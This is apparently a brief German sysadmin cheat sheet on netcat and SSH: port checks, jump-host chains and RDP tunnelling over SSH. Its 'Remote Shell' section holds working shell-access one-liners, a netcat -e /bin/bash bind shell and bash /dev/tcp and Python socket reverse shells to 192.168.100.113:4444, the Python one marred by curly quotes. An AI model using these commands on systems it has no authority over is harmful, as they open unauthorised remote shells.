.. _nc_allg:

################
Netcat
################

Port offen:
============
nc -zv <host> <port>


Remote Shell
==============
Target Host: nc -lvp <port>
Source Host: 
* nc <target-ip> <port> -e /bin/bash

Alternativ via Bourne Shell auf dem target host:
Auf dem Target: bash -i >& /dev/tcp/192.168.100.113/4444 0>&1

Alternativ via Python auf dem target host:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);''


SSH
=====

Jumphost
---------

ssh über zwei Jumphosts:
    ssh -A -J <user@jmp1host>,<user@jmp2host> <user>@<zielhost>
    
    oder .ssh/config
    Host <zielhost>
        ProxyJump <user@jmp1host>,<user@jmp2host> <user>@<zielhost>

    dann mit <user>@<zielhost> anmelden

Windows RDP über ssh-Jumphost
------------------------------
ssh -L 33389:<windows terminalserver>:3389 -N <user>@<linux jumphost>

